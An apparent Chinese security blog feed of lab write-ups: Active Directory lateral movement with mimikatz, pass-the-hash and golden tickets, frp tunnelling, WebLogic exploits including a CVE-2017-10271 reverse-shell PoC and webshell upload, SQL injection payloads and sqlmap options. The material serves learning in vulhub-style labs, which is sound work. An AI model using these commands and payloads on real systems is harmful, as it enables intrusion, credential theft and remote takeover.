aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669397283562-2f18dfdd-aa27-4c3e-9a46-99183fef1105.png"></p><pre class="line-numbers language-none"><code class="language-none">3.使用共享文件夹上传至域控主机    net use \\192.168.93.30\ipc$ "Whoami2021" /user:"Administrator"   # 建立空连接    copy 8888.exe \\192.168.93.30\c$   # 上传至域控主机    net time \\192.168.93.30# 查看主机当前时间记住把路径对上，别的目录没试过，你可以试试<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669397550139-6e79736f-5640-429d-9752-b057c225a0cb.png"></p><pre class="line-numbers language-none"><code class="language-none">4.在域控机上面设置计划任务执行smb_8888木马  schtasks /create /s \\192.168.93.30 /u Administrator /p Whoami2021 /tn test /tr C:\smb_8888.exe  /sc once /st 14:59  时间设置成你当前系统时间后面一点就行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669397829670-651d4fe3-49f3-4ae5-bfbe-17fe825b2d1a.png"></p><pre class="line-numbers language-none"><code class="language-none">出了点问题，没拿到dc，换种方法尝试psexec获取DC目的添加一个通往192.168.93.1/24网段的路由，这样msf就能进入93网段了。这个前面已经添加了使用exploit/windows/smb/psexec模块进行权限获取    set rhosts 192.168.93.30    set SMBUser Administrator    set SMBPass Whoami2021    set payload windows/meterpreter/bind_tcp经过查找发现需要更换target<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669399083047-18f305fb-93aa-44bc-bf41-29b1c8dae525.png"></p><pre class="line-numbers language-none"><code class="language-none">已经拿了4台了，就剩一个pc2了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669399196285-085b017a-1ea2-4a5f-93e3-d4ac2484f239.png"></p><pre class="line-numbers language-none"><code class="language-none">先尝试制作黄金票据和哈希传递，上传猕猴桃mimikatz.exe到域控主机上面。后面再打那台pc2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669399458720-1e706dfc-79e9-4ffd-95e8-5d5583c91b49.png"></p><pre class="line-numbers language-none"><code class="language-none">搞起命令：privilege::debuglsadump::dcsync /user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669399525374-52fe2305-920a-4ac8-83bf-8f02aa4e0d0f.png"></p><p><img src="/images/1669399734590-dd2d83d4-c91f-42a9-ad99-acf10b455039.png"></p><pre class="line-numbers language-none"><code class="language-none">提取sid和hash ntlm获取关键信息：Object Security ID : S-1-5-21-1315137663-3706837544-1429009142-502Hash NTLM: 6be58bfcc0a164af2408d1d3bd313c2a哈希传递到域成员PC1主机上面，上传猕猴桃并制作黄金票据,先试试哈希传递。sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669399888528-281c3ac5-c325-4839-aeb0-06c0cccb8120.png"></p><pre class="line-numbers language-none"><code class="language-none">得到ntlm：ab89b1295e69d353dd7614c7a3a80cec sekurlsa::pth /user:administrator /domain:whoamianony.org /ntlm:ab89b1295e69d353dd7614c7a3a80cec上传成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669400523341-3c61a10d-60d8-4b32-84dc-60b3bcb35e45.png"></p><p><img src="/images/1669400599791-6bebd0be-8424-47df-94c9-496fbb568d31.png"></p><pre class="line-numbers language-none"><code class="language-none">随后应该会弹cmd框，但是这里看不到弹框，直接到PC1主机上面试试哈希传递效果（之前没搞过试试），以管理员身份运行猕猴桃.    dir \\DC.whoamianony.org\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669401315079-7d891468-7f46-4f51-8355-84437e89efc9.png"></p><pre class="line-numbers language-none"><code class="language-none">dir \\DC.whoamianony.org\c$\users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669401388318-430d5c1f-12d1-4598-8208-4691cb692e3b.png"></p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\DC.whoamianony.org cmd.exe 即可反弹域控的shell挺好玩的，在pc1居然拿到了dc的命令终端，但是我没成功，你可以试试小伙子<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669401515509-c2f563f4-42db-4711-9c4b-6dc7495c81a8.png"></p><pre class="line-numbers language-none"><code class="language-none">制作票据：    kerberos::golden /user:administrator /domain:whoamianony.org /sid:S-1-5-21-1315137663-3706837544-1429009142 /krbtgt:6be58bfcc0a164af2408d1d3bd313c2a /ticket:administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669401863519-3153532c-162b-468a-ac7f-f65260242aa3.png"></p><pre class="line-numbers language-none"><code class="language-none">加载票据：    kerberos::ptt administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/1669401987646-8b8b5999-738a-4fa5-8118-262aff8e552f.png"></p><pre class="line-numbers language-none"><code class="language-none">好，开始攻打最后一台pc2，干永恒之蓝打PC2内网穿透-2进行第三层内网穿透PC1（192.168.52.30和192.168.93.20）(由于第一次的内网穿透使用的是web1相当于使用web1访问了其他52网段的机器，现在我们要进入93网段访问需要正向连接进行永恒之蓝攻击获取会话。因此需要使用pc1的192.168.93.20-IP进行内网穿透。我们主机是访问不了192.168.52.30，所以需要一个中间人web1)。首先攻击机上执行如下命令添加一个转接隧道，监听1090端口，并将1090端口收到的代理请求发送给9998端口，执行命令：    ./ew_for_linux64 -s lcx_listen -l 1090 -e 9998然后在第二层网络的Windows服务器PC1上传ew_for_Win.exe，并利用ssocksd方式启动999端口的正向socks代理，执行命令：    ew_for_Win.exe -s ssocksd -l 999最后，在Web1上传的ew_for_linux64并利用lcx_slave方式，将攻击机的9998端口与第二层网络Windows 7的999端口连接起来，执行命令：    ./ew_for_linux64 -s lcx_slave -d 192.168.0.138 -e 9998 -f 192.168.52.30 -g 999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669402199710-77acbc2c-4e95-4c4b-bec0-c8a09b9a781e.png"></p><p><img src="/images/1669402787887-c2882212-b798-4fee-ae68-dcd761827e46.png"></p><p><img src="/images/1669402831524-eca4e1f3-bc8f-4b57-96db-9ac1f610be32.png"></p><p><img src="/images/1669402734956-63b6e3b2-0044-4aab-a649-0b912cd1b09d.png"></p><p><img src="/images/1669402942507-930a7912-6b4c-4cae-bd8a-55416bf1cd66.png"></p><pre class="line-numbers language-none"><code class="language-none">有一个，拿下收工，美滋滋<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669403043132-a50268f4-8c7f-4e00-ba3a-911c7e5cc79d.png"></p><p>靶场下载地址：</p><ul><li>靶场链接：<a href="https://pan.baidu.com/s/1qavABmu8E75Q4y6os-Joqw">https://pan.baidu.com/s/1qavABmu8E75Q4y6os-Joqw</a></li><li>提取密码：ci20</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3层内网穿透搭建</title>
      <link href="/2023/02/07/3-ceng-nei-wang-chuan-tou-da-jian/"/>
      <url>/2023/02/07/3-ceng-nei-wang-chuan-tou-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="基于三层内网的网络穿透的搭建"><a href="#基于三层内网的网络穿透的搭建" class="headerlink" title="基于三层内网的网络穿透的搭建"></a>基于三层内网的网络穿透的搭建</h1><p>首先准备4台靶机, windows2012作为最外面的攻击机，windows2008作为第一层跳板机，</p><p>windows7作为第二层跳板机，最里面的windows7开启web服务。</p><pre class="line-numbers language-none"><code class="language-none">打开vmware workstation的虚拟网络编辑器，新增四张网卡，全部选择仅主机模式。给它们配置四个不同的网段，配置如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/vmnet4.jpg"></p><p>网络拓扑图如下：</p><p><img src="/images/networkdj.png"></p><pre class="line-numbers language-none"><code class="language-none">记得配置好网卡，并进行ping测试看看能不能互通，如果不能互通的话，很有可能是主机的防火墙没关网卡配置如下：windows 2012  VMnet10 VMnet11windows 2008  VMnet11 VMnet12Windows7    VMnet12  VMnet13web windows7 VMnet13记得查看每台机器的IP地址是不是在该网段上，如果不在。记得看下自己网卡的属性的IPv4是不是设置了自动获得IP地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在就让我们来基于网络拓扑图来构建frp穿透吧：</p><p>给每台机器都上传对应的frp穿透工具：</p><pre class="line-numbers language-none"><code class="language-none">windows2012：  上传frp服务端和服务端配置文件，配置如下：  [common]  bind_port = 7000windows2008:上传frp服务端和客户端和对应的配置文件，配置如下:frps配置:[common]bind_port = 7000frpc配置:[common]server_addr = 172.16.16.128server_port = 7000[socks5]type = tcplocal_ip = 127.0.0.1local_port = 9999remote_port = 9000windows7:上传frp客户端和对应的配置文件，配置如下:[common]server_addr = 10.0.0.128server_port = 7000[socks5]type = tcpplugin = socks5remote_port = 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在开始开启frp穿透：</p><pre class="line-numbers language-none"><code class="language-none">windows2012开启frps：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/windows2012frps.jpg"></p><pre class="line-numbers language-none"><code class="language-none">windows2008分别开启frps和frpc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/windows2008frps_frpc.jpg"></p><pre class="line-numbers language-none"><code class="language-none">windows7开启frpc:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/windows7frpc.jpg"></p><pre class="line-numbers language-none"><code class="language-none">最后在web windows上开启web服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_windows7.jpg"></p><pre class="line-numbers language-none"><code class="language-none">成功后，用我们的windows2012攻击机访问web windows7的web服务，看看我们的frp服务有没有搭建成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_windows7_failed.jpg"></p><pre class="line-numbers language-none"><code class="language-none">如图所示：很遗憾，并没有成功。在我不假思索之际，得亏坤哥大师傅的指点。原来我们只是把windows7的9000端口转发出来了，而我们的流量没有经过9000端口。所以得用Proxifier把全局流量代理到9000端口。配置如下：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/proxifier_ip.jpg"></p><pre class="line-numbers language-none"><code class="language-none">先配置代理的端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/proxifier_rules.jpg"></p><pre class="line-numbers language-none"><code class="language-none">配置代理规则<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_success.jpg"></p><pre class="line-numbers language-none"><code class="language-none">可以看到，访问成功，至此实现了frp三层代理最后只能说一句：坤哥yyds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic复现</title>
      <link href="/2023/02/04/weblogic-fu-xian/"/>
      <url>/2023/02/04/weblogic-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="weblogic弱口令"><a href="#weblogic弱口令" class="headerlink" title="weblogic弱口令"></a>weblogic弱口令</h1><p><strong>漏洞复现</strong></p><p>首先进入vluhub靶场中的weak_password 的docker环境</p><p><img src="/images/weakpasswd.jpg" alt="weak_password"></p><pre class="line-numbers language-none"><code class="language-none">访问一下开启的web服务，出现404<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/404.jpg"></p><pre class="line-numbers language-none"><code class="language-none">访问http://127.0.0.1:7001/console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/console.jpg"></p><pre class="line-numbers language-none"><code class="language-none">此处存在一个文件读取漏洞，可以通过访问http://your-ip:7001/hello/file.jsp?path=/etc/passwd读取文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/filepasswd.jpg"></p><pre class="line-numbers language-none"><code class="language-none">那么我们可以读取后台用户密文与密钥文件，weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）。SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/dat.jpg"></p><pre class="line-numbers language-none"><code class="language-none">config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的&lt;node-manager-password-encrypted&gt;的值，即为加密后的管理员密码，不要找错了：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/encrypt.jpg"></p><pre class="line-numbers language-none"><code class="language-none">然后用靶场decrpty里面的工具解密<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/decrpty.jpg"></p><p><strong>常用的Weblogic弱口令</strong></p><table><thead><tr><th>system</th><th>system</th></tr></thead><tbody><tr><td>system</td><td>weblogic</td></tr><tr><td>guest</td><td>guest</td></tr><tr><td>portaladmin</td><td>portaladmin</td></tr><tr><td>admin</td><td>security</td></tr><tr><td>joe</td><td>password</td></tr><tr><td>mary</td><td>password</td></tr><tr><td>system</td><td>security</td></tr><tr><td>wlcsystem</td><td>wlcsystem</td></tr><tr><td>wlcsystem</td><td>sipisystem</td></tr></tbody></table><p><strong>后台上传war包Getshell</strong></p><pre class="line-numbers language-none"><code class="language-none">首先用Godzilla生成一个jsp木马，然后将jsp木马打包成war包上传到网站<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/Godzilla.jpg"></p><pre class="line-numbers language-none"><code class="language-none">先进行部署，然后安装<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/bushu.jpg"></p><p><img src="/images/anzhuang.jpg"></p><pre class="line-numbers language-none"><code class="language-none">上传文件,然后一直点下一步即可,最后点击完成即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/uploadgodzilla.jpg"></p><p><img src="/"></p><p><img src="/images/next.jpg"></p><pre class="line-numbers language-none"><code class="language-none">上传成功之后用godzilla连接，http://your-ip:7001/war包名/1.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/shell.jpg"></p><h1 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h1><p>XMLDecoder反序列化漏洞(CVE-2017-10271)</p><p><strong>漏洞复现</strong></p><pre class="line-numbers language-none"><code class="language-none">先启动vulhub靶场的漏洞环境<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/XMLDecoder.jpg"></p><pre class="line-numbers language-none"><code class="language-none">浏览器访问http://192.168.0.104:7001/wls-wsat/CoordinatorPortType 如下图所示则存在漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/weblogic_xmlDecoder.jpg"></p><pre class="line-numbers language-none"><code class="language-none">在burp中构造poc，用nc监听<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">poc脚本:&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;    &lt;soapenv:Header&gt;        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;            &lt;java version="1.8.0" class="java.beans.XMLDecoder"&gt;                &lt;void class="java.lang.ProcessBuilder"&gt;                    &lt;array class="java.lang.String" length="3"&gt;                        &lt;void index="0"&gt;                            &lt;string&gt;/bin/bash&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index="1"&gt;                            &lt;string&gt;-c&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index="2"&gt;                            &lt;string&gt;bash -i &gt;&amp; /dev/tcp//4444 0&gt;&amp;1&lt;/string&gt;                        &lt;/void&gt; #/dev/tcp/监听机的ip/监听的端口                    &lt;/array&gt;                    &lt;void method="start"/&gt;                &lt;/void&gt;            &lt;/java&gt;        &lt;/work:WorkContext&gt;    &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/weblogic_xml_shell.jpg"></p><pre class="line-numbers language-none"><code class="language-none">如上图所示，拿到shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql学习笔记</title>
      <link href="/2023/02/03/sql-xue-xi-bi-ji/"/>
      <url>/2023/02/03/sql-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<p><strong>原理</strong>：</p><pre class="line-numbers language-none"><code class="language-none">sql注入是web应用程序对用户输入的数据的合法性没有进行判断，前端传入到后端的数据是可控的，并且参数被带入到数据库中查询，那么攻击者就可以构造指定的sql语句从而对数据库进行任意操作。但是sql注入得满足两个条件：1. 用户参数可控，前端传入到后端得数据内容是用户可以控制得。2. 参数被带入到数据库中查询，传入的参数被拼接到sql语句中，从而被带入到数据库中进行查询<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>sql查询语句及其一些内置函数</strong></p><pre class="line-numbers language-none"><code class="language-none">首先先介绍一下sql查询语句的一些语法：在不知道任何条件时，语句如下所示：SELECT 要查询的字段名 FROM 库名.表名在知道一条已知的条件时，语句如下所示：SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件的字段名='已知条件的值'在知道两条已知的条件时，语句如下所示：SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件1的字段名='已知条件1的值' AND 已知条件2的字段名='已知条件2的值'需要记住的一些MySQL数据库的内置函数：database(), schema() # 查询数据库的库名version()，@@version # 查询当前数据库的版本user(), system_user() # 查询当前使用数据库的用户是谁@@datadir # 查询当前数据库存放的物理路径@@version_compile_os # 查询当前数据库所使用的操作系统注：这些语法是MySQL数据库的语法，别的数据库语法与这数据库语法略有不同，通过这些函数能了解到关于该数据库的很多信息，对后面的帮助很大 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>sql注入攻击的一些方法</strong></p><pre class="line-numbers language-none"><code class="language-none">union注入攻击：通过union select联合查询的方法，来得到数据库中的信息union select 1,(select table_name from information_schema.tables where table_schema=schema()),3--+union select 1,(select column_name from information_schema.columns where table_schema=schema() and table_name ='表名'),3--+union select 1,(select group_concat(table_name) from '表名')--+ # 此处用group_concat是因为数据太多了，显示不出来，所以使用group_concat 把它的列和行压缩成一行展示出来Boolean注入攻击：就是一种通过页面回显的内容来确定页面的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>报错注入攻击</strong>：</p><pre class="line-numbers language-none"><code class="language-none">就是一种通过页面报错来获取数据库中的一些信息，但是它有一个前提条件，那就是数据库配置文件中有类似于print_r(mysql_error)此类的方法##### 下面是一些报错注入的一些函数：xpath处理函数报错：updatexml(xml_doc,xpath,new_value), extractvalue(xml_doc,xpath)整型溢出报错：exp几何函数报错：geometrycollection(), polygon(), multipolygon(), linestring(), multilinestring(), multipoint()列名重复报错：name_const()函数虚拟主键重复报错：floor+rand()+group by http://sqli.com/Less-1/?id=1' and (select 1 from (select count(*), concat(database(),floor (rand(0)*2))x from information_schema.tables group by x)a)--+爆表名http://sqli.com/Less-1/?id=1' and (select 1 from (select count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema = schema()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+爆列名http://sqli.com/Less-1/?id=1' and (select 1 from (select count(*), concat((select group_concat(column_name) from information_schema.columns where table_schema = schema() and table_name ='users'),floor (rand(0)*2))x from information_schema.tables group by x)a)--+从列表为username，password中提取出数据http://sqli.com/Less-1/?id=1' and (select 1 from (select count(*), concat((select concat(username,'~',password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间盲注</strong>：</p><pre class="line-numbers language-none"><code class="language-none">和布尔盲注类似，只不过布尔盲注是通过页面的信息来判断的，而时间盲注是通过页面的回显时间http://sqli.com/Less-1/?id=1' and if (length(database())&gt;2, sleep(5),sleep(1))--+用来截取数据库的长度，改变2的值，通过页面回显时间来最终确定数据库的长度http://sqli.com/Less-1/?id=1' and if (substr(database(),1,1)='s', sleep(5),sleep(1))--+用来截取当前数据库的库名，还是一样，通过更改前面那个1的值，然后根据页面的回显时间来最终确定该数据库的库名，因为时间盲注和布尔盲注比较复杂，所以到时会写成python脚本来执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>堆叠注入</strong>：</p><pre class="line-numbers language-none"><code class="language-none">就是用;写入两个sql语句，然后分别执行两个sql语句，其它也就是php代码中mysqli_multi_query这个函数起的作用。multi这个单词代表了多次，堆叠注入的危害很大，可以直接delete from 表名，或者直接truncate table 表名等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>二次注入</strong></p><pre class="line-numbers language-none"><code class="language-none">就是类似于攻击者先构造一个恶意数据并被带到数据库中存储起来了，然后当我们去调用存储在数据库中的恶意数据与sql语句拼接进行查询，就造成了二次注入。举个例子，数据库中有一个用户名admin， 密码admin的用户。然后我们注册一个用户名为admin'#，密码为12345的用户，此时该数据已经被存储到数据库中了。然后我们修改admin'#的用户的密码，到最后会发现其它被改密码的不是admin'#用户，而是admin。这是因为 UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'把我们修改的用户带入到里面去执行就变成了：UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass' #此时’admin'后面的语句被#注释了#真正生效的语句就是UPDATE users SET PASSWORD='$pass' where username ='admin' #所以就达到了修改admin用户密码的目的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>宽字节注入</strong></p><pre class="line-numbers language-none"><code class="language-none">宽字节注入其实就是当数据库是gbk编码时，传入的单引号被转义了，\的编码是%5c,我们此时通过在'前面给它加一个%df，而%df和%5c组合会组合成一个汉字。就会把单引号逃逸出来，数据库就会报错，就可以达到我们的效果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><p>后面还有一些COOKIE注入，XFF注入，base64注入，其实原理跟前面的雷同</p><h4 id="下面将介绍一些绕过技巧："><a href="#下面将介绍一些绕过技巧：" class="headerlink" title="下面将介绍一些绕过技巧："></a>下面将介绍一些绕过技巧：</h4><pre class="line-numbers language-none"><code class="language-none">- 双写绕过- 大小写绕过- 编码绕过(url解析一般都是一次，我们可以尝试给url编码二次试试)- 内联注释绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>sql修复建议</strong></p><pre class="line-numbers language-none"><code class="language-none">1. 过滤危险字符，采用正则表达式匹配union，sleep，load_file，into outfile等关键字，如果匹配到，就退出程序，2. 使用PDO预编译语句，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增删查改。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至此完结，本人小白一枚，写博客纯属为了记笔记，如果有大佬看到这个网站，千万不要喷我，我是小菜鸡一枚。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理分析 </tag>
            
            <tag> sql学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap命令行参数解析</title>
      <link href="/2023/02/03/sqlmap-ming-ling-xing-can-shu-jie-xi/"/>
      <url>/2023/02/03/sqlmap-ming-ling-xing-can-shu-jie-xi/</url>
      
        <content type="html"><![CDATA[<p><strong>1. 基本参数</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap --update  更新sqlmap -h  查看常用参数sqlmap -hh  查看全部参数sqlmap --version 查看版本sqlmap -v 查看执行过程信息，默认是1，一共0~6sqlmap -d  “mysql://user:password@192.168.20.10:3386/dvwa" #mysql表示数据库类型， user:password表示目标服务器的账号和密码， @后表示要连接的服务器，3306表示端口，dvwa表示连 接的数据库名称sqlmap --wizard # 向导式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2. 确定目标</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u  "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" # 指定URL,get请求方式sqlmap -m url_list.txt # 使用一个包含多个url的文件进行扫描。若有重复，sqlmap会自动识别成一个。sqlmqp -g "inurl:\".php?id=1\"" #扫描，使用Google语法得到的，urlsqlmap -r  request.txt #Post提交方式，使用BurpSuite的log文件。(Options--&gt;Music--&gt;Logging--&gt;Spider--&gt;勾选Request) 5.1 --scopt="(www)?\.target\.(com|net|arg)" # 基于正则表达式去过滤日志内容，筛选需要扫描的对象。sqlmap -c  sqlmap.conf # 使用配置文件进行扫描（dpkg -L sqlmap | grep sqlmap.conf)sqlmap -u "http://target_url/param1/value1*/param2/value2" # 对于这种写法，加*号扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3. 配置目标参数</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap -p "username, id" # 指定要扫描的参数sqlmap --skip="id,user-agent" # 排除指定的扫描参数sqlmap --data="user=1&amp;pass=2" # 指定扫描的参数，get/post都适用sqlmap --param-del=";" # 改变分隔符，默认是&amp;，因为有些网站不实用&amp;传递多个数据sqlmap --cookie="security=low;PHPSESSID=121123131" # 使用cookie的身份认证--drop-set-cookie # 有时候发起请求后，服务器端会重新Set-cookie给客户端，SQLmap默认会使用新的cookie，这时候可以设置此参数，表示还是用原来的cookie。--user-aget="aaaaa" # 使用浏览器代理头--random-agent # 使用随机的浏览器代理头--host="aaaa" # 使用主机头--referer="aaaa" # 使用referer头--headers="host:aaaa\nUser-Agent:bbbb" # 有些网站需要特定的头来身份验证--method=GET #指定请求方式，还有POST--auth-type Basic --auth-cred "user:pass" # 身份认证，还有Digest， NTLM--auth-file="ca.PEM" # 使用私钥证书去进行身份认证，还有个参数--auth-cert，未知用法。--proxy="http://127.0.0.1:8087/" # 使用代理去扫描目标，代理软件占用的端口在8087--proxy-cred="name:pass" # 使用代理时的账户和密码--ignore-proxy # 忽略系统级代理设置，通常用于扫描本地网络目标，本网段。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4. 配置目标行为</strong></p><pre class="line-numbers language-none"><code class="language-none">--force-ssl  # 使用HTTPS连接进行扫描--delay="3" # 每次http请求之间的延迟时间，默认无延迟--timeout="10" # 请求超时时间，浮点数，默认为30秒--retries="1" # http连接的重试次数，默认3次--randomize="id" # 长度，类型与原始值保持一致的情况下，随机参数的取值。比如id=100-&gt; id=1??--safe-url="" # 检测盲注阶段时，sqlmap会发送大量失败请求，可能导致服务器端销毁session--safe-freq # 每发送多少次注入请求后，发送一次正常请求，配合--safe-url使用。--time-sec="3" # 基于时间的注入检测相应延迟时间，默认5秒--union-cols 6-9 # 默认联合查询1-10列，随--level增加，最多支持100列。--union-char  123 # 联合查询默认使用null，极端情况下可能失败，此时可以手动执行数值--technique US # 指定检测注入时所用技术， 默认情况下sqlmap会使用自己支持的全部技术进项检测，有B, E, U, S, T, Q<span aria-hidden="true" 